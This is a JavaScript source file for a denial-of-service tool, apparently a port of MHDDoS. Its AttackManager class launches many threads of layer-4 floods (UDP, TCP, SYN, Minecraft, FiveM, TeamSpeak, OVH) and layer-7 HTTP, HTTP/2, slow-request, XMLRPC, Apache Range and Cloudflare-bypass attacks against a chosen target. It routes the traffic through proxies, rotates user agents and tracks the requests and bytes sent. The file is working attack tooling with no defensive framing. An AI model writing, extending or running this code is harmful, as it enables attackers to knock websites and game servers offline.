import { REQUESTS_SENT, BYTES_SENT } from '../utils/counter.js';
import { Tools } from '../utils/tools.js';
import { logger } from '../utils/logger.js';

// Layer 4 Methods
import { 
    UDPFlood, 
    TCPFlood, 
    MinecraftFlood, 
    MinecraftBot,
    SYNFlood,
    VSEFlood,
    TS3Flood,
    MCPEFlood,
    FiveMFlood,
    FiveMTokenFlood,
    CPSFlood,
    ConnectionFlood,
    OVHUDPFlood
} from '../methods/layer4/index.js';

// Layer 7 Methods
import { 
    HTTPGetFlood, 
    HTTPPostFlood, 
    HTTPSlowAttack 
} from '../methods/layer7/http.js';

import { 
    HTTP2Flood, 
    HTTP2PostFlood, 
    HTTP2CFBypass 
} from '../methods/layer7/http2.js';

import { 
    CloudflareBypass, 
    AdvancedBypass, 
    BotSimulation 
} from '../methods/layer7/bypass.js';

import {
    StressAttack,
    NullAttack,
    DynamicAttack,
    XMLRPCAttack,
    ApacheRangeAttack,
    CookieAttack
} from '../methods/layer7/advanced.js';

/**
 * Attack Manager - Coordinates all attack operations
 */
export class AttackManager {
    constructor(options) {
        this.target = options.target;
        this.method = options.method.toUpperCase();
        this.threads = options.threads || 100;
        this.duration = options.duration || 60;
        this.rpc = options.rpc || 1;
        this.proxies = options.proxies || null;
        this.userAgents = options.userAgents || [];
        this.referers = options.referers || [];
        
        this.active = false;
        this.attackThreads = [];
        this.startTime = null;
        this.statsInterval = null;
    }

    /**
     * Start the attack
     */
    async start() {
        this.active = true;
        this.startTime = Date.now();
        this.autoStopTimeout = null;

        logger.info(`🎯 Starting ${this.method} attack on ${this.target}`);
        logger.info(`⚙️  Threads: ${this.threads}, Duration: ${this.duration}s`);

        // Reset counters
        REQUESTS_SENT.reset();
        BYTES_SENT.reset();

        // Create attack threads (non-blocking)
        setImmediate(() => {
            for (let i = 0; i < this.threads; i++) {
                const attackInstance = this.createAttackInstance();
                if (attackInstance) {
                    this.attackThreads.push(attackInstance);
                    attackInstance.start().catch(err => {
                        // Log errors but don't stop attack
                        logger.debug(`Thread ${i} error: ${err.message}`);
                    });
                }
            }
        });

        // Start stats monitoring
        this.startStatsMonitoring();

        // Auto-stop after duration
        this.autoStopTimeout = setTimeout(() => {
            this.stop();
        }, this.duration * 1000);
    }

    /**
     * Create attack instance based on method
     */
    createAttackInstance() {
        const method = this.method;

        // Layer 4 Methods
        if (['UDP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new UDPFlood(host, port, this.duration, this.proxies);
        }

        if (['TCP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new TCPFlood(host, port, this.duration, this.proxies);
        }

        if (['MINECRAFT'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new MinecraftFlood(host, port, this.duration, 47, this.proxies);
        }

        if (['MCBOT'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new MinecraftBot(host, port, this.duration, 47, 'MHDDoS_');
        }

        if (['SYN'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new SYNFlood(host, port, this.duration, this.proxies);
        }

        if (['VSE'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new VSEFlood(host, port, this.duration, this.proxies);
        }

        if (['TS3'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new TS3Flood(host, port, this.duration, this.proxies);
        }

        if (['MCPE'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new MCPEFlood(host, port, this.duration, this.proxies);
        }

        if (['FIVEM'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new FiveMFlood(host, port, this.duration, this.proxies);
        }

        if (['FIVEM-TOKEN'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new FiveMTokenFlood(host, port, this.duration, this.proxies);
        }

        if (['CPS'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new CPSFlood(host, port, this.duration, this.proxies);
        }

        if (['CONNECTION'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new ConnectionFlood(host, port, this.duration, this.proxies);
        }

        if (['OVH-UDP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new OVHUDPFlood(host, port, this.duration, this.proxies);
        }

        // Layer 7 Methods
        if (['GET'].includes(method)) {
            return new HTTPGetFlood(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['POST'].includes(method)) {
            return new HTTPPostFlood(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['SLOW'].includes(method)) {
            return new HTTPSlowAttack(
                this.target, 
                this.duration, 
                this.userAgents, 
                this.proxies
            );
        }

        if (['HTTP2', 'HTTP2-GET'].includes(method)) {
            return new HTTP2Flood(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['HTTP2-POST'].includes(method)) {
            return new HTTP2PostFlood(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['HTTP2-CF', 'CFB'].includes(method)) {
            return new HTTP2CFBypass(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['BYPASS', 'CFBUAM'].includes(method)) {
            return new AdvancedBypass(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.proxies
            );
        }

        if (['BOT'].includes(method)) {
            return new BotSimulation(
                this.target, 
                this.duration, 
                this.rpc
            );
        }

        if (['STRESS'].includes(method)) {
            return new StressAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['NULL'].includes(method)) {
            return new NullAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['DYN'].includes(method)) {
            return new DynamicAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['XMLRPC'].includes(method)) {
            return new XMLRPCAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['APACHE'].includes(method)) {
            return new ApacheRangeAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['COOKIE'].includes(method)) {
            return new CookieAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['HEAD'].includes(method)) {
            // HEAD method can use GET flood with method override
            const attack = new HTTPGetFlood(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
            // Override method in the attack class
            attack.httpMethod = 'HEAD';
            return attack;
        }

        logger.error(`Unknown method: ${method}`);
        return null;
    }

    /**
     * Parse target into host and port
     */
    parseTarget() {
        if (this.target.includes('://')) {
            const url = new URL(this.target);
            return [url.hostname, url.port || 80];
        }

        if (this.target.includes(':')) {
            const [host, port] = this.target.split(':');
            return [host, parseInt(port)];
        }

        return [this.target, 80];
    }

    /**
     * Start statistics monitoring
     */
    startStatsMonitoring() {
        this.statsInterval = setInterval(() => {
            const elapsed = Math.floor((Date.now() - this.startTime) / 1000);
            const progress = Math.floor((elapsed / this.duration) * 100);

            logger.info(
                `📊 Progress: ${progress}% | ` +
                `Requests: ${Tools.humanFormat(REQUESTS_SENT.get())} | ` +
                `Data: ${Tools.humanBytes(BYTES_SENT.get())} | ` +
                `Time: ${elapsed}s / ${this.duration}s`
            );

            // Don't reset counters - keep accumulating for total stats
        }, 1000);
    }

    /**
     * Stop the attack
     */
    stop() {
        if (!this.active) return;

        this.active = false;
        logger.info('🛑 Stopping attack...');

        // Clear auto-stop timeout
        if (this.autoStopTimeout) {
            clearTimeout(this.autoStopTimeout);
            this.autoStopTimeout = null;
        }

        // Stop all attack threads
        this.attackThreads.forEach(thread => {
            if (thread && thread.stop) {
                thread.stop();
            }
        });

        // Clear attack threads array
        this.attackThreads = [];

        // Clear stats interval
        if (this.statsInterval) {
            clearInterval(this.statsInterval);
            this.statsInterval = null;
        }

        logger.success('✅ Attack stopped successfully!');
        logger.info(`📊 Final Stats - Requests: ${Tools.humanFormat(REQUESTS_SENT.get())} | Data: ${Tools.humanBytes(BYTES_SENT.get())}`);
    }

    /**
     * Check if attack is active
     */
    isActive() {
        return this.active;
    }

    /**
     * Get current statistics
     */
    getStats() {
        const elapsed = this.startTime 
            ? Math.floor((Date.now() - this.startTime) / 1000)
            : 0;

        return {
            target: this.target,
            method: this.method,
            threads: this.threads,
            duration: this.duration,
            elapsed: elapsed,
            requestsSent: Tools.humanFormat(REQUESTS_SENT.get()),
            bytesSent: Tools.humanBytes(BYTES_SENT.get())
        };
    }
}
